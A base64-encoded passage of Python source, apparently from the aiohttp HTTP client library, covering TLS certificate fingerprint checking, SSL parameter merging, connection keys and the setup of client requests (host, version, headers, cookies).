VsZiwgZmluZ2VycHJpbnQ6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgIGRpZ2VzdGxlbiA9IGxlbihmaW5nZXJwcmludClcclxuICAgICAgICBoYXNoZnVuYyA9IHNlbGYuSEFTSEZVTkNfQllfRElHRVNUTEVOLmdldChkaWdlc3RsZW4pXHJcbiAgICAgICAgaWYgbm90IGhhc2hmdW5jOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJmaW5nZXJwcmludCBoYXMgaW52YWxpZCBsZW5ndGgiKVxyXG4gICAgICAgIGVsaWYgaGFzaGZ1bmMgaXMgbWQ1IG9yIGhhc2hmdW5jIGlzIHNoYTE6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAibWQ1IGFuZCBzaGExIGFyZSBpbnNlY3VyZSBhbmQgIiAibm90IHN1cHBvcnRlZC4gVXNlIHNoYTI1Ni4iXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLl9oYXNoZnVuYyA9IGhhc2hmdW5jXHJcbiAgICAgICAgc2VsZi5fZmluZ2VycHJpbnQgPSBmaW5nZXJwcmludFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGZpbmdlcnByaW50KHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9maW5nZXJwcmludFxyXG5cclxuICAgIGRlZiBjaGVjayhzZWxmLCB0cmFuc3BvcnQ6IGFzeW5jaW8uVHJhbnNwb3J0KSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCB0cmFuc3BvcnQuZ2V0X2V4dHJhX2luZm8oInNzbGNvbnRleHQiKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgc3Nsb2JqID0gdHJhbnNwb3J0LmdldF9leHRyYV9pbmZvKCJzc2xfb2JqZWN0IilcclxuICAgICAgICBjZXJ0ID0gc3Nsb2JqLmdldHBlZXJjZXJ0KGJpbmFyeV9mb3JtPVRydWUpXHJcbiAgICAgICAgZ290ID0gc2VsZi5faGFzaGZ1bmMoY2VydCkuZGlnZXN0KClcclxuICAgICAgICBpZiBnb3QgIT0gc2VsZi5fZmluZ2VycHJpbnQ6XHJcbiAgICAgICAgICAgIGhvc3QsIHBvcnQsICpfID0gdHJhbnNwb3J0LmdldF9leHRyYV9pbmZvKCJwZWVybmFtZSIpXHJcbiAgICAgICAgICAgIHJhaXNlIFNlcnZlckZpbmdlcnByaW50TWlzbWF0Y2goc2VsZi5fZmluZ2VycHJpbnQsIGdvdCwgaG9zdCwgcG9ydClcclxuXHJcblxyXG5pZiBzc2wgaXMgbm90IE5vbmU6XHJcbiAgICBTU0xfQUxMT1dFRF9UWVBFUyA9IChzc2wuU1NMQ29udGV4dCwgYm9vbCwgRmluZ2VycHJpbnQsIHR5cGUoTm9uZSkpXHJcbmVsc2U6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIFNTTF9BTExPV0VEX1RZUEVTID0gdHlwZShOb25lKVxyXG5cclxuXHJcbmRlZiBfbWVyZ2Vfc3NsX3BhcmFtcyhcclxuICAgIHNzbDogVW5pb25bIlNTTENvbnRleHQiLCBib29sLCBGaW5nZXJwcmludCwgTm9uZV0sXHJcbiAgICB2ZXJpZnlfc3NsOiBPcHRpb25hbFtib29sXSxcclxuICAgIHNzbF9jb250ZXh0OiBPcHRpb25hbFsiU1NMQ29udGV4dCJdLFxyXG4gICAgZmluZ2VycHJpbnQ6IE9wdGlvbmFsW2J5dGVzXSxcclxuKSAtPiBVbmlvblsiU1NMQ29udGV4dCIsIGJvb2wsIEZpbmdlcnByaW50LCBOb25lXTpcclxuICAgIGlmIHZlcmlmeV9zc2wgaXMgbm90IE5vbmUgYW5kIG5vdCB2ZXJpZnlfc3NsOlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJ2ZXJpZnlfc3NsIGlzIGRlcHJlY2F0ZWQsIHVzZSBzc2w9RmFsc2UgaW5zdGVhZCIsXHJcbiAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgc3RhY2tsZXZlbD0zLFxyXG4gICAgICAgIClcclxuICAgICAgICBpZiBzc2wgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAidmVyaWZ5X3NzbCwgc3NsX2NvbnRleHQsIGZpbmdlcnByaW50IGFuZCBzc2wgIlxyXG4gICAgICAgICAgICAgICAgInBhcmFtZXRlcnMgYXJlIG11dHVhbGx5IGV4Y2x1c2l2ZSJcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNzbCA9IEZhbHNlXHJcbiAgICBpZiBzc2xfY29udGV4dCBpcyBub3QgTm9uZTpcclxuICAgICAgICB3YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAic3NsX2NvbnRleHQgaXMgZGVwcmVjYXRlZCwgdXNlIHNzbD1jb250ZXh0IGluc3RlYWQiLFxyXG4gICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsXHJcbiAgICAgICAgICAgIHN0YWNrbGV2ZWw9MyxcclxuICAgICAgICApXHJcbiAgICAgICAgaWYgc3NsIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgInZlcmlmeV9zc2wsIHNzbF9jb250ZXh0LCBmaW5nZXJwcmludCBhbmQgc3NsICJcclxuICAgICAgICAgICAgICAgICJwYXJhbWV0ZXJzIGFyZSBtdXR1YWxseSBleGNsdXNpdmUiXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzc2wgPSBzc2xfY29udGV4dFxyXG4gICAgaWYgZmluZ2VycHJpbnQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgImZpbmdlcnByaW50IGlzIGRlcHJlY2F0ZWQsICIgInVzZSBzc2w9RmluZ2VycHJpbnQoZmluZ2VycHJpbnQpIGluc3RlYWQiLFxyXG4gICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsXHJcbiAgICAgICAgICAgIHN0YWNrbGV2ZWw9MyxcclxuICAgICAgICApXHJcbiAgICAgICAgaWYgc3NsIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgInZlcmlmeV9zc2wsIHNzbF9jb250ZXh0LCBmaW5nZXJwcmludCBhbmQgc3NsICJcclxuICAgICAgICAgICAgICAgICJwYXJhbWV0ZXJzIGFyZSBtdXR1YWxseSBleGNsdXNpdmUiXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzc2wgPSBGaW5nZXJwcmludChmaW5nZXJwcmludClcclxuICAgIGlmIG5vdCBpc2luc3RhbmNlKHNzbCwgU1NMX0FMTE9XRURfVFlQRVMpOlxyXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgInNzbCBzaG91bGQgYmUgU1NMQ29udGV4dCwgYm9vbCwgRmluZ2VycHJpbnQgb3IgTm9uZSwgIlxyXG4gICAgICAgICAgICAiZ290IHshcn0gaW5zdGVhZC4iLmZvcm1hdChzc2wpXHJcbiAgICAgICAgKVxyXG4gICAgcmV0dXJuIHNzbFxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIHNsb3RzPVRydWUsIGZyb3plbj1UcnVlKVxyXG5jbGFzcyBDb25uZWN0aW9uS2V5OlxyXG4gICAgIyB0aGUga2V5IHNob3VsZCBjb250YWluIGFuIGluZm9ybWF0aW9uIGFib3V0IHVzZWQgcHJveHkgLyBUTFNcclxuICAgICMgdG8gcHJldmVudCByZXVzaW5nIHdyb25nIGNvbm5lY3Rpb25zIGZyb20gYSBwb29sXHJcbiAgICBob3N0OiBzdHJcclxuICAgIHBvcnQ6IE9wdGlvbmFsW2ludF1cclxuICAgIGlzX3NzbDogYm9vbFxyXG4gICAgc3NsOiBVbmlvbltTU0xDb250ZXh0LCBOb25lLCBib29sLCBGaW5nZXJwcmludF1cclxuICAgIHByb3h5OiBPcHRpb25hbFtVUkxdXHJcbiAgICBwcm94eV9hdXRoOiBPcHRpb25hbFtCYXNpY0F1dGhdXHJcbiAgICBwcm94eV9oZWFkZXJzX2hhc2g6IE9wdGlvbmFsW2ludF0gICMgaGFzaChDSU11bHRpRGljdClcclxuXHJcblxyXG5kZWYgX2lzX2V4cGVjdGVkX2NvbnRlbnRfdHlwZShcclxuICAgIHJlc3BvbnNlX2NvbnRlbnRfdHlwZTogc3RyLCBleHBlY3RlZF9jb250ZW50X3R5cGU6IHN0clxyXG4pIC0+IGJvb2w6XHJcbiAgICBpZiBleHBlY3RlZF9jb250ZW50X3R5cGUgPT0gImFwcGxpY2F0aW9uL2pzb24iOlxyXG4gICAgICAgIHJldHVybiBqc29uX3JlLm1hdGNoKHJlc3BvbnNlX2NvbnRlbnRfdHlwZSkgaXMgbm90IE5vbmVcclxuICAgIHJldHVybiBleHBlY3RlZF9jb250ZW50X3R5cGUgaW4gcmVzcG9uc2VfY29udGVudF90eXBlXHJcblxyXG5cclxuY2xhc3MgQ2xpZW50UmVxdWVzdDpcclxuICAgIEdFVF9NRVRIT0RTID0ge1xyXG4gICAgICAgIGhkcnMuTUVUSF9HRVQsXHJcbiAgICAgICAgaGRycy5NRVRIX0hFQUQsXHJcbiAgICAgICAgaGRycy5NRVRIX09QVElPTlMsXHJcbiAgICAgICAgaGRycy5NRVRIX1RSQUNFLFxyXG4gICAgfVxyXG4gICAgUE9TVF9NRVRIT0RTID0ge2hkcnMuTUVUSF9QQVRDSCwgaGRycy5NRVRIX1BPU1QsIGhkcnMuTUVUSF9QVVR9XHJcbiAgICBBTExfTUVUSE9EUyA9IEdFVF9NRVRIT0RTLnVuaW9uKFBPU1RfTUVUSE9EUykudW5pb24oe2hkcnMuTUVUSF9ERUxFVEV9KVxyXG5cclxuICAgIERFRkFVTFRfSEVBREVSUyA9IHtcclxuICAgICAgICBoZHJzLkFDQ0VQVDogIiovKiIsXHJcbiAgICAgICAgaGRycy5BQ0NFUFRfRU5DT0RJTkc6ICJnemlwLCBkZWZsYXRlIixcclxuICAgIH1cclxuXHJcbiAgICBib2R5ID0gYiIiXHJcbiAgICBhdXRoID0gTm9uZVxyXG4gICAgcmVzcG9uc2UgPSBOb25lXHJcblxyXG4gICAgX3dyaXRlciA9IE5vbmUgICMgYXN5bmMgdGFzayBmb3Igc3RyZWFtaW5nIGRhdGFcclxuICAgIF9jb250aW51ZSA9IE5vbmUgICMgd2FpdGVyIGZ1dHVyZSBmb3IgXCcxMDAgQ29udGludWVcJyByZXNwb25zZVxyXG5cclxuICAgICMgTi5CLlxyXG4gICAgIyBBZGRpbmcgX19kZWxfXyBtZXRob2Qgd2l0aCBzZWxmLl93cml0ZXIgY2xvc2luZyBkb2VzblwndCBtYWtlIHNlbnNlXHJcbiAgICAjIGJlY2F1c2UgX3dyaXRlciBpcyBpbnN0YW5jZSBtZXRob2QsIHRodXMgaXQga2VlcHMgYSByZWZlcmVuY2UgdG8gc2VsZi5cclxuICAgICMgVW50aWwgd3JpdGVyIGhhcyBmaW5pc2hlZCBmaW5hbGl6ZXIgd2lsbCBub3QgYmUgY2FsbGVkLlxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIG1ldGhvZDogc3RyLFxyXG4gICAgICAgIHVybDogVVJMLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgcGFyYW1zOiBPcHRpb25hbFtNYXBwaW5nW3N0ciwgc3RyXV0gPSBOb25lLFxyXG4gICAgICAgIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgICAgIHNraXBfYXV0b19oZWFkZXJzOiBJdGVyYWJsZVtzdHJdID0gZnJvemVuc2V0KCksXHJcbiAgICAgICAgZGF0YTogQW55ID0gTm9uZSxcclxuICAgICAgICBjb29raWVzOiBPcHRpb25hbFtMb29zZUNvb2tpZXNdID0gTm9uZSxcclxuICAgICAgICBhdXRoOiBPcHRpb25hbFtCYXNpY0F1dGhdID0gTm9uZSxcclxuICAgICAgICB2ZXJzaW9uOiBodHRwLkh0dHBWZXJzaW9uID0gaHR0cC5IdHRwVmVyc2lvbjExLFxyXG4gICAgICAgIGNvbXByZXNzOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBjaHVua2VkOiBPcHRpb25hbFtib29sXSA9IE5vbmUsXHJcbiAgICAgICAgZXhwZWN0MTAwOiBib29sID0gRmFsc2UsXHJcbiAgICAgICAgbG9vcDogT3B0aW9uYWxbYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcF0gPSBOb25lLFxyXG4gICAgICAgIHJlc3BvbnNlX2NsYXNzOiBPcHRpb25hbFtUeXBlWyJDbGllbnRSZXNwb25zZSJdXSA9IE5vbmUsXHJcbiAgICAgICAgcHJveHk6IE9wdGlvbmFsW1VSTF0gPSBOb25lLFxyXG4gICAgICAgIHByb3h5X2F1dGg6IE9wdGlvbmFsW0Jhc2ljQXV0aF0gPSBOb25lLFxyXG4gICAgICAgIHRpbWVyOiBPcHRpb25hbFtCYXNlVGltZXJDb250ZXh0XSA9IE5vbmUsXHJcbiAgICAgICAgc2Vzc2lvbjogT3B0aW9uYWxbIkNsaWVudFNlc3Npb24iXSA9IE5vbmUsXHJcbiAgICAgICAgc3NsOiBVbmlvbltTU0xDb250ZXh0LCBib29sLCBGaW5nZXJwcmludCwgTm9uZV0gPSBOb25lLFxyXG4gICAgICAgIHByb3h5X2hlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10gPSBOb25lLFxyXG4gICAgICAgIHRyYWNlczogT3B0aW9uYWxbTGlzdFsiVHJhY2UiXV0gPSBOb25lLFxyXG4gICAgKTpcclxuXHJcbiAgICAgICAgaWYgbG9vcCBpcyBOb25lOlxyXG4gICAgICAgICAgICBsb29wID0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcblxyXG4gICAgICAgIGFzc2VydCBpc2luc3RhbmNlKHVybCwgVVJMKSwgdXJsXHJcbiAgICAgICAgYXNzZXJ0IGlzaW5zdGFuY2UocHJveHksIChVUkwsIHR5cGUoTm9uZSkpKSwgcHJveHlcclxuICAgICAgICAjIEZJWE1FOiBzZXNzaW9uIGlzIE5vbmUgaW4gdGVzdHMgb25seSwgbmVlZCB0byBmaXggdGVzdHNcclxuICAgICAgICAjIGFzc2VydCBzZXNzaW9uIGlzIG5vdCBOb25lXHJcbiAgICAgICAgc2VsZi5fc2Vzc2lvbiA9IGNhc3QoIkNsaWVudFNlc3Npb24iLCBzZXNzaW9uKVxyXG4gICAgICAgIGlmIHBhcmFtczpcclxuICAgICAgICAgICAgcSA9IE11bHRpRGljdCh1cmwucXVlcnkpXHJcbiAgICAgICAgICAgIHVybDIgPSB1cmwud2l0aF9xdWVyeShwYXJhbXMpXHJcbiAgICAgICAgICAgIHEuZXh0ZW5kKHVybDIucXVlcnkpXHJcbiAgICAgICAgICAgIHVybCA9IHVybC53aXRoX3F1ZXJ5KHEpXHJcbiAgICAgICAgc2VsZi5vcmlnaW5hbF91cmwgPSB1cmxcclxuICAgICAgICBzZWxmLnVybCA9IHVybC53aXRoX2ZyYWdtZW50KE5vbmUpXHJcbiAgICAgICAgc2VsZi5tZXRob2QgPSBtZXRob2QudXBwZXIoKVxyXG4gICAgICAgIHNlbGYuY2h1bmtlZCA9IGNodW5rZWRcclxuICAgICAgICBzZWxmLmNvbXByZXNzID0gY29tcHJlc3NcclxuICAgICAgICBzZWxmLmxvb3AgPSBsb29wXHJcbiAgICAgICAgc2VsZi5sZW5ndGggPSBOb25lXHJcbiAgICAgICAgaWYgcmVzcG9uc2VfY2xhc3MgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmVhbF9yZXNwb25zZV9jbGFzcyA9IENsaWVudFJlc3BvbnNlXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmVhbF9yZXNwb25zZV9jbGFzcyA9IHJlc3BvbnNlX2NsYXNzXHJcbiAgICAgICAgc2VsZi5yZXNwb25zZV9jbGFzcyA9IHJlYWxfcmVzcG9uc2VfY2xhc3MgICMgdHlwZTogVHlwZVtDbGllbnRSZXNwb25zZV1cclxuICAgICAgICBzZWxmLl90aW1lciA9IHRpbWVyIGlmIHRpbWVyIGlzIG5vdCBOb25lIGVsc2UgVGltZXJOb29wKClcclxuICAgICAgICBzZWxmLl9zc2wgPSBzc2xcclxuXHJcbiAgICAgICAgaWYgbG9vcC5nZXRfZGVidWcoKTpcclxuICAgICAgICAgICAgc2VsZi5fc291cmNlX3RyYWNlYmFjayA9IHRyYWNlYmFjay5leHRyYWN0X3N0YWNrKHN5cy5fZ2V0ZnJhbWUoMSkpXHJcblxyXG4gICAgICAgIHNlbGYudXBkYXRlX3ZlcnNpb24odmVyc2lvbilcclxuICAgICAgICBzZWxmLnVwZGF0ZV9ob3N0KHVybClcclxuICAgICAgICBzZWxmLnVwZGF0ZV9oZWFkZXJzKGhlYWRlcnMpXHJcbiAgICAgICAgc2VsZi51cGRhdGVfYXV0b19oZWFkZXJzKHNraXBfYXV0b19oZWFkZXJzKVxyXG4gICAgICAgIHNlbGYudXBkYXRlX2Nvb2tpZXMoY29va2llcylcclxuICAgICAgICBzZWxmLnVwZGF0ZV9jb250ZW50X2VuY29kaW5nKGRhdGEpXHJcbiAgICAgICAgc2VsZi51cGRhdGVfYXV0aChhdXRoKVxyXG4gICAgICAgIHNlbGYudXBkYXRlX3Byb3h5KHByb3h5LCBwcm94eV9hdXRoLCBwcm94eV9oZWFkZXJzKVxyXG5cclxuICAgICAgICBzZWxmLnVwZGF0ZV9ib2R5X2Zyb21fZGF0YShkYXRhKVxyXG4gICAgICAgIGlmIGRhdGEgaXMgbm90IE5vbmUgb3Igc2VsZi5tZXRob2Qgbm90IGluIHNlbGYuR0VUX01FVEhPRFM6XHJcbiAgICAgICAgICAgIHNlbGYudXBkYXRlX3RyYW5zZmVyX2VuY29kaW5nKClcclxuICAgICAgICBzZWxmLnVwZGF0ZV9leHBlY3RfY29udGludWUoZXhwZWN0MTAwKVxyXG4gICAgICAgIGlmIHRyYWNlcyBpcyBOb25lOlxyXG4gICAgICAgICAgICB0cmFjZXMgPSBbXVxyXG4gICAgICAgIHNlbGYuX3RyYWNlcyA9IHRyYWNlc1xyXG5cclxuICAgIGRlZiBpc19zc2woc2VsZikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gc2VsZi51cmwuc2NoZW1lIGluICgiaHR0cHMiLCAid3NzIilcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBzc2woc2VsZikgLT4gVW5pb25bIlNTTENvbnRleHQiLCBOb25lLCBib29sLCBGaW5nZXJwcmludF06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3NzbFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNvbm5lY3Rpb25fa2V5KHNlbGYpIC0+IENvbm5lY3Rpb25LZXk6XHJcbiAgICAgICAgcHJveHlfaGVhZGVycyA9IHNlbGYucHJveHlfaGVhZGVyc1xyXG4gICAgICAgIGlmIHByb3h5X2hlYWRlcnM6XHJcbiAgICAgICAgICAgIGggPSBoYXNoKFxyXG4gICAgICAgICAgICAgICAgdHVwbGUoKGssIHYpIGZvciBrLCB2IGluIHByb3h5X2hlYWRlcnMuaXRlbXMoKSlcclxuICAgICAgICAgICAgKSAgIyB0eXBlOiBPcHRpb25hbFtpbnRdXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgaCA9IE5vbmVcclxuICAgICAgICByZXR1cm4gQ29ubmVjdGlvbktleShcclxuICAgICAgICAgICAgc2VsZi5ob3N0LFxyXG4gICAgICAgICAgICBzZWxmLnBvcnQsXHJcbiAgICAgICAgICAgIHNlbGYuaXNfc3NsKCksXHJcbiAgICAgICAgICAgIHNlbGYuc3NsLFxyXG4gICAgICAgICAgICBzZWxmLnByb3h5LFxyXG4gICAgICAgICAgICBzZWxmLnByb3h5X2F1dGgsXHJcbiAgICAgICAgICAgIGgsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGhvc3Qoc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldCA9IHNlbGYudXJsLnJhd19ob3N0XHJcbiAgICAgICAgYXNzZXJ0IHJldCBpcyBub3QgTm9uZVxyXG4gICAgICAgIHJldHVybiByZXRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBwb3J0KHNlbGYpIC0+IE9wdGlvbmFsW2ludF06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYudXJsLnBvcnRcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiByZXF1ZXN0X2luZm8oc2VsZikgLT4gUmVxdWVzdEluZm86XHJcbiAgICAgICAgaGVhZGVycyA9IENJTXVsdGlEaWN0UHJveHkoc2VsZi5oZWFkZXJzKSAgIyB0eXBlOiBDSU11bHRpRGljdFByb3h5W3N0cl1cclxuICAgICAgICByZXR1cm4gUmVxdWVzdEluZm8oc2VsZi51cmwsIHNlbGYubWV0aG9kLCBoZWFkZXJzLCBzZWxmLm9yaWdpbmFsX3VybClcclxuXHJcbiAgICBkZWYgdXBkYXRlX2hvc3Qoc2VsZiwgdXJsOiBVUkwpIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiVXBkYXRlIGRlc3RpbmF0aW9uIGhvc3QsIHBvcnQgYW5kIGNvbm5lY3Rpb24gdHlwZSAoc3NsKS4iIiJcclxuICAgICAgICAjIGdldCBob3N0L3BvcnRcclxuICAgICAgICBpZiBub3QgdXJsLnJhd19ob3N0OlxyXG4gICAgICAgICAgICByYWlzZSBJbnZhbGlkVVJMKHVybClcclxuXHJcbiAgICAgICAgIyBiYXNpYyBhdXRoIGluZm9cclxuICAgICAgICB1c2VybmFtZSwgcGFzc3dvcmQgPSB1cmwudXNlciwgdXJsLnBhc3N3b3JkXHJcbiAgICAgICAgaWYgdXNlcm5hbWU6XHJcbiAgICAgICAgICAgIHNlbGYuYXV0aCA9IGhlbHBlcnMuQmFzaWNBdXRoKHVzZXJuYW1lLCBwYXNzd29yZCBvciAiIilcclxuXHJcbiAgICBkZWYgdXBkYXRlX3ZlcnNpb24oc2VsZiwgdmVyc2lvbjogVW5pb25baHR0cC5IdHRwVmVyc2lvbiwgc3RyXSkgLT4gTm9uZTpcclxuICAgICAgICAiIiJDb252ZXJ0IHJlcXVlc3QgdmVyc2lvbiB0byB0d28gZWxlbWVudHMgdHVwbGUuXHJcblxyXG4gICAgICAgIHBhcnNlciBIVFRQIHZlcnNpb24gXCcxLjFcJyA9PiAoMSwgMSlcclxuICAgICAgICAiIiJcclxuICAgICAgICBpZiBpc2luc3RhbmNlKHZlcnNpb24sIHN0cik6XHJcbiAgICAgICAgICAgIHYgPSBbcGFydC5zdHJpcCgpIGZvciBwYXJ0IGluIHZlcnNpb24uc3BsaXQoIi4iLCAxKV1cclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgdmVyc2lvbiA9IGh0dHAuSHR0cFZlcnNpb24oaW50KHZbMF0pLCBpbnQodlsxXSkpXHJcbiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICBmIkNhbiBub3QgcGFyc2UgaHR0cCB2ZXJzaW9uIG51bWJlcjoge3ZlcnNpb259IlxyXG4gICAgICAgICAgICAgICAgKSBmcm9tIE5vbmVcclxuICAgICAgICBzZWxmLnZlcnNpb24gPSB2ZXJzaW9uXHJcblxyXG4gICAgZGVmIHVwZGF0ZV9oZWFkZXJzKHNlbGYsIGhlYWRlcnM6IE9wdGlvbmFsW0xvb3NlSGVhZGVyc10pIC0+IE5vbmU6XHJcbiAgICAgICAgIiIiVXBkYXRlIHJlcXVlc3QgaGVhZGVycy4iIiJcclxuICAgICAgICBzZWxmLmhlYWRlcnMgPSBDSU11bHRpRGljdCgpICAjIHR5cGU6IENJTXVsdGlEaWN0W3N0cl1cclxuXHJcbiAgICAgICAgIyBhZGQgaG9zdFxyXG4gICAgICAgIG5ldGxvYyA9IGNhc3Qoc3RyLCBzZWxmLnVybC5yYXdfaG9zdClcclxuICAgICAgICBpZiBoZWxwZXJzLmlzX2lwdjZfYWRkcmVzcyhuZXRsb2MpOlxyXG4gICAgICAgICAgICBuZXRsb2MgPSBmIlt7bmV0bG9jfV0iXHJcbiAgICAgICAgaWYgc2VsZi51cmwucG9ydCBpcyBub3QgTm9uZSBhbmQgbm90IHNlbGYudXJsLmlzX2RlZmF1bHRfcG9ydCgpOlxyXG4gICAgICAgICAgICBuZXRsb2MgKz0gIjoiICsgc3RyKHNlbGYudXJsLnBvcnQpXHJcbiAgICAgICAgc2VsZi5oZWFkZXJzW2hkcnMuSE9TVF0gPSBuZXRsb2NcclxuXHJcbiAgICAgICAgaWYgaGVhZGVyczpcclxuICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShoZWFkZXJzLCAoZGljdCwgTXVsdGlEaWN0UHJveHksIE11bHRpRGljdCkpOlxyXG4gICAgICAgICAgICAgICAgaGVhZGVycyA9IGhlYWRlcnMuaXRlbXMoKSAgIyB0eXBlOiBpZ25vcmVbYXNzaWdubWVudF1cclxuXHJcbiAgICAgICAgICAgIGZvciBrZXksIHZhbHVlIGluIGhlYWRlcnM6ICAjIHR5cGU6IGlnbm9yZVttaXNjXVxyXG4gICAgICAgICAgICAgICAgIyBBIHNwZWNpYWwgY2FzZSBmb3IgSG9zdCBoZWFkZXJcclxuICAgICAgICAgICAgICAgIGlmIGtleS5sb3dlcigpID09ICJob3N0IjpcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmhlYWRlcnNba2V5XSA9IHZhbHVlXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuaGVhZGVycy5hZGQoa2V5LCB2YWx1ZSlcclxuXHJcbiAgICBkZWYgdXBkYXRlX2F1dG9faGVhZGVycyhzZWxmLCBza2lwX2F1dG9faGVhZGVyczogSXRlcmFibGVbc3RyXSkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLnNraXBfYXV0b19oZWFkZXJzID0gQ0lNdWx0aURpY3QoXHJcbiAgICAgICAgICAgIChoZHIsIE5vbmUpIGZvciBoZHIgaW4gc29ydGVkKHNraXBfYXV0b19oZWFkZXJzKVxyXG4gICAgICAgIClcclxuICAgICAgICB1c2VkX2hlYWRlcnMgPSBzZWxmLmhlYWRlcnMuY29weSgpXHJcbiAgICAgICAgdXNlZF9oZWFkZXJzLmV4dGVuZChzZWxmLnNraXBfYXV0b19oZWFkZXJzKSAgIyB0eXBlOiBpZ25vcmVbYXJnLXR5cGVdXHJcblxyXG4gICAgICAgIGZvciBoZHIsIHZhbCBpbiBzZWxmLkRFRkFVTFRfSEVBREVSUy5pdGVtcygpOlxyXG4gICAgICAgICAgICBpZiBoZHIgbm90IGluIHVzZWRfaGVhZGVyczpcclxuICAgICAgICAgICAgICAgIHNlbGYuaGVhZGVycy5hZGQoaGRyLCB2YWwpXHJcblxyXG4gICAgICAgIGlmIGhkcnMuVVNFUl9BR0VOVCBub3QgaW4gdXNlZF9oZWFkZXJzOlxyXG4gICAgICAgICAgICBzZWxmLmhlYWRlcnNbaGRycy5VU0VSX0FHRU5UXSA9IFNFUlZFUl9TT0ZUV0FSRVxyXG5cclxuICAgIGRlZiB1cGRhdGVfY29va2llcyhzZWxmLCBjb29raWVzOiBPcHRpb25hbFtMb29zZUNvb2tpZXNdKSAtPiBOb25lOlxyXG4gICAgICAgICIiIlVwZGF0ZSByZXF1ZXN0IGNvb2tpZXMgaGVhZGVyLiIiIlxyXG4gICAgICAgIGlmIG5vdCBjb29raWVzOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgYyA9IFNpbXBsZUNvb2tpZSgpICAjIHR5cGU6IFNpbXBsZUNvb2tpZVtzdHJdXHJcbiAgICAgICAgaWYgaGRycy5DT09LSUUgaW4gc2VsZi5oZWFkZXJzOlxyXG4gICAgICAgICAgICBjLmxvYWQoc2VsZi5oZWFkZXJzLmdldChoZHJzLkNPT0tJRSwgIiIpKVxyXG4gICAgICAgICAgICBkZWwgc2VsZi5oZWFkZXJzW2hkcnMuQ09PS0lFXVxyXG5cclxuICAgICAgICBpZiBpc2luc3RhbmNlKGNvb2tpZXMsIE1hcHBpbmcpOlxyXG4gICAgICAgICAgICBpdGVyX2Nvb2tpZXMgPSBjb29raWVzLml0ZW1zKClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBpdGVyX2Nvb2tpZXMgPSBjb29raWVzICAjIHR5cGU6IGlnbm9yZVthc3NpZ25tZW50XVxyXG4gICAgICAgIGZvciBuYW1lLCB2YWx1ZSBpbiBpdGVyX2Nvb2tpZXM6XHJcbiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsdWUsIE1vcnNlbCk6XHJcbiAgICAgICAgICAgICAgICAj